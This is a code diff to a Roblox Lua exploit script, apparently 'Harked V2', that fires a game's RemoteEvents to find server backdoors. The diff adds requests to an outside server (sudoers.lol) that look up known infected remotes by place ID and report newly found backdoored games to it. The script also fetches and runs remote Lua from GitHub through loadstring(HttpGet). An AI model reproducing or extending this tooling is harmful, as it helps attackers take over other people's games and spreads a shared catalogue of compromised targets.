@@ -1,4 +1,3 @@
--- Instances: 11 | Scripts: 4 | Modules: 0 | Tags: 0
 local G2L = {};
 
 -- StarterGui.HarkScanner
@@ -147,11 +146,29 @@ local script = G2L["7"];
 			tbtext = script.Parent,
 			mgui = script.Parent.Parent.Parent,
 			backdoorfound = false,
-			safetime = 0.32,
+			safetime = 0.265,
 			testpart = Players.LocalPlayer:FindFirstChild("StarterGear") or Players.LocalPlayer.Character:FindFirstChild("Head"),
-			vulnremote = nil
+			vulnremote = nil,
+			jeff = false,
+			postGame = "https://sudoers.lol/strawberrycmd/v1/game",
+			getinfectedremote = "https://sudoers.lol/strawberrycmd/v1/getinfectedremote"
 	
 		}
+		
+		local httpget = function(url)
+			local response = request({
+				Url = url,
+				Method = "GET",
+				Headers = {
+					["Content-Type"] = "application/json"
+				}
+			});
+			if response and (response.StatusCode == 200 or response.Status == 200) then
+				return response.Body
+			end
+			return nil
+		end
+		
 		
 		
 		if stuff.AlreadyScanned then return end
@@ -192,7 +209,25 @@ local script = G2L["7"];
 			end
 			return false
 		end; -- // checks a remote event for a backdoor or vulnerability by firing it and seeing if it does something
-	 
+		
+		
+		local success, result = pcall(function()
+			local res = httpget(stuff.getinfectedremote .."?id=" .. game.PlaceId)
+			return game:GetService("HttpService"):JSONDecode(res)
+		end)
+		if success and result and result.success == true then
+			for i, v in ipairs(game:GetDescendants()) do
+				if v:IsA("RemoteEvent") then
+					if v.Name == result.infectedremote then
+						if remoteBackdoored(v) == true then
+							stuff.jeff = true
+							stuff.backdoorfound = true
+							break
+						end
+					end
+				end
+			end
+		end
 		local function scan()
 			if stuff.backdoorfound then return end;
 			for _, v in ipairs(game:GetDescendants()) do
@@ -205,7 +240,7 @@ local script = G2L["7"];
 					if remoteBackdoored(v) == true then
 						stuff.backdoorfound = true
 						print("Harked V2: found!")
-						return -- // backdoor found so breaks the loop
+						break -- // backdoor found so breaks the loop
 					else
 						-- // keeps scanning if a backdoor isent found
 					end -- // tests remote for backdoor
@@ -213,20 +248,36 @@ local script = G2L["7"];
 			end
 		end -- // scans a place for vulnerable remotes
 	
-		task.wait(2)-- // 2 sec delay before scanning to stop huge lag spike
-		scan() -- // scans the WHOLE game for vuln/backdoored remotes
-		task.wait()
+		if not stuff.jeff then
+			task.wait(2)-- // 2 sec delay before scanning to stop huge lag spike
+			scan() -- // scans the WHOLE game for vuln/backdoored remotes
+			task.wait()
+		end
 		if stuff.backdoorfound then
 			-- // loads up the gui
 			stuff.tbtext.Text = "Backdoor found."
 			
 			getgenv().vulnremote = stuff.vulnremote
-			loadstring(game:HttpGet("https://raw.githubusercontent.com/Robloxexploiter691/harked-v2/refs/heads/main/wh.lua"))()
+			if not stuff.jeff then
+				
+				local body = {
+					gameId = game.PlaceId,
+					infectedRemote = tostring(stuff.vulnremote.Name) -- feed remotevent name
+				}
+				
+				request({
+					Url = stuff.postGame,
+					Method = "POST",
+					Headers = {
+						["Content-Type"] = "application/json"
+					},
+					Body = game:GetService("HttpService"):JSONEncode(body)
+				})
+			end
 			loadstring(game:HttpGet("https://raw.githubusercontent.com/Robloxexploiter691/harked-v2/refs/heads/main/rayfielduiharked.lua"))()
 			task.wait(5)
 			stuff.mgui:Destroy()
 		else
-			deletebind:Destroy()		
 			stuff.tbtext.Text = "No backdoor found."
 			task.wait(10)
 			stuff.mgui:Destroy()
